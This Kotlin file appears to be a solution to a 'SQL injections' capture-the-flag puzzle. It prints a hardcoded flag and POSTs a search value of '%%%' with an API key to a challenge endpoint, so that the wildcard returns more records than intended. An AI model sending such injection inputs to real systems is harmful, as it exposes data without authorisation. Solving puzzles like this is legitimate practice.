package luke.day05


import luke.Luke
import org.codehaus.jackson.map.ObjectMapper
import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse

fun main() {
    Day05().run()
}

class Day05 : Luke() {
    override fun day() = 5
    override fun title() = "SQL injections"

    private val mapper = ObjectMapper()

    override fun run() {
        println("PST{5Q1_1nj€Ⓒt10n}")


        val values = mapOf("key" to "v1_pgmsqxmddz", "search" to "%%%")
        val valuesAsJson = mapper.writeValueAsString(values)
        println("valuesAsJson:" +valuesAsJson)

        val client = HttpClient.newBuilder().build();
        val request = HttpRequest.newBuilder()
            .uri(URI.create("https://varelager.p26e.dev/api/search"))
            .POST(HttpRequest.BodyPublishers.ofString(valuesAsJson))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .build()

        val response = client.send(request, HttpResponse.BodyHandlers.ofString());

        println (response.body())
    } // run


    fun String.utf8(): String = URLEncoder.encode(this, "UTF-8")

    fun formData(data: Map<String, String>): HttpRequest.BodyPublisher? {

        val res = data.map { (k, v) -> "${(k.utf8())}=${v.utf8()}" }
            .joinToString("&")

        return HttpRequest.BodyPublishers.ofString(res)
    } // formData


}
